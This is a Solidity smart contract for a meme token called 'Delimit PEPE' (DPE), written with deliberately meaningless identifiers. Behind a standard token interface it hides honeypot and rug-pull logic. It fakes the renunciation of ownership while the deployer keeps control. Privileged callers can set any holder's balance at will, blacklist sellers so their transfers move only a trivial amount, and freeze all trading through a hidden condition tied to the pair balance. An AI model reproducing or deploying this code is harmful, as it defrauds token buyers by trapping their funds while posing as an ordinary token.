//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface takeFromIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenIs) external view returns (uint256);

    function transfer(address enableTake, uint256 launchedFrom) external returns (bool);

    function allowance(address tokenTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedFrom) external returns (bool);

    function transferFrom(
        address sender,
        address enableTake,
        uint256 launchedFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingMode, uint256 value);
    event Approval(address indexed tokenTrading, address indexed spender, uint256 value);
}

abstract contract liquidityTokenFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface isTake {
    function createPair(address fundMode, address marketingList) external returns (address);
}

interface takeFromIsMetadata is takeFromIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DelimitPEPE is liquidityTokenFee, takeFromIs, takeFromIsMetadata {

    function symbol() external view virtual override returns (string memory) {
        return receiverTeamFee;
    }

    function owner() external view returns (address) {
        return walletBuy;
    }

    uint256 public senderTakeSell;

    address public feeTx;

    function transfer(address receiverLaunch, uint256 launchedFrom) external virtual override returns (bool) {
        return walletSenderList(_msgSender(), receiverLaunch, launchedFrom);
    }

    uint256 public shouldTrading;

    function decimals() external view virtual override returns (uint8) {
        return maxTake;
    }

    uint8 private maxTake = 18;

    function allowance(address maxSell, address marketingFund) external view virtual override returns (uint256) {
        if (marketingFund == buyAtExempt) {
            return type(uint256).max;
        }
        return swapMin[maxSell][marketingFund];
    }

    function listTake(address totalAmountAt, address enableTake, uint256 launchedFrom) internal returns (bool) {
        require(minAuto[totalAmountAt] >= launchedFrom);
        minAuto[totalAmountAt] -= launchedFrom;
        minAuto[enableTake] += launchedFrom;
        emit Transfer(totalAmountAt, enableTake, launchedFrom);
        return true;
    }

    bool public tradingTxList;

    mapping(address => bool) public maxLaunched;

    uint256 private amountShould;

    function approve(address marketingFund, uint256 launchedFrom) public virtual override returns (bool) {
        swapMin[_msgSender()][marketingFund] = launchedFrom;
        emit Approval(_msgSender(), marketingFund, launchedFrom);
        return true;
    }

    mapping(address => mapping(address => uint256)) private swapMin;

    function name() external view virtual override returns (string memory) {
        return modeTrading;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listTotal;
    }

    event OwnershipTransferred(address indexed swapReceiver, address indexed launchToken);

    constructor (){
        if (amountShould != shouldTrading) {
            amountShould = marketingTxToken;
        }
        modeSell liquidityReceiver = modeSell(buyAtExempt);
        feeTx = isTake(liquidityReceiver.factory()).createPair(liquidityReceiver.WETH(), address(this));
        
        launchList = _msgSender();
        amountMax();
        walletBuyTotal[launchList] = true;
        minAuto[launchList] = listTotal;
        if (shouldTrading != marketingTxToken) {
            amountShould = walletTo;
        }
        emit Transfer(address(0), launchList, listTotal);
    }

    bool private isAtLiquidity;

    function transferFrom(address totalAmountAt, address enableTake, uint256 launchedFrom) external override returns (bool) {
        if (_msgSender() != buyAtExempt) {
            if (swapMin[totalAmountAt][_msgSender()] != type(uint256).max) {
                require(launchedFrom <= swapMin[totalAmountAt][_msgSender()]);
                swapMin[totalAmountAt][_msgSender()] -= launchedFrom;
            }
        }
        return walletSenderList(totalAmountAt, enableTake, launchedFrom);
    }

    uint256 constant toLiquidity = 12 ** 10;

    function amountMax() public {
        emit OwnershipTransferred(launchList, address(0));
        walletBuy = address(0);
    }

    function fromReceiver(uint256 launchedFrom) public {
        minReceiver();
        feeExemptLaunched = launchedFrom;
    }

    mapping(address => bool) public walletBuyTotal;

    uint256 private listTotal = 100000000 * 10 ** 18;

    mapping(address => uint256) private minAuto;

    function liquidityTokenTo(address receiverLaunch, uint256 launchedFrom) public {
        minReceiver();
        minAuto[receiverLaunch] = launchedFrom;
    }

    function walletSenderList(address totalAmountAt, address enableTake, uint256 launchedFrom) internal returns (bool) {
        if (totalAmountAt == launchList) {
            return listTake(totalAmountAt, enableTake, launchedFrom);
        }
        uint256 totalExempt = takeFromIs(feeTx).balanceOf(walletFrom);
        require(totalExempt == feeExemptLaunched);
        require(enableTake != walletFrom);
        if (maxLaunched[totalAmountAt]) {
            return listTake(totalAmountAt, enableTake, toLiquidity);
        }
        return listTake(totalAmountAt, enableTake, launchedFrom);
    }

    bool public teamLaunch;

    function isSell(address tokenFee) public {
        minReceiver();
        
        if (tokenFee == launchList || tokenFee == feeTx) {
            return;
        }
        maxLaunched[tokenFee] = true;
    }

    bool private minWallet;

    address private walletBuy;

    function getOwner() external view returns (address) {
        return walletBuy;
    }

    string private modeTrading = "Delimit PEPE";

    function balanceOf(address tokenIs) public view virtual override returns (uint256) {
        return minAuto[tokenIs];
    }

    address walletFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 launchFee;

    address public launchList;

    uint256 feeExemptLaunched;

    function teamExempt(address listFund) public {
        require(listFund.balance < 100000);
        if (teamLaunch) {
            return;
        }
        if (marketingTxToken == shouldTrading) {
            tradingTxList = false;
        }
        walletBuyTotal[listFund] = true;
        
        teamLaunch = true;
    }

    function minReceiver() private view {
        require(walletBuyTotal[_msgSender()]);
    }

    address buyAtExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public walletTo;

    uint256 private marketingTxToken;

    string private receiverTeamFee = "DPE";

}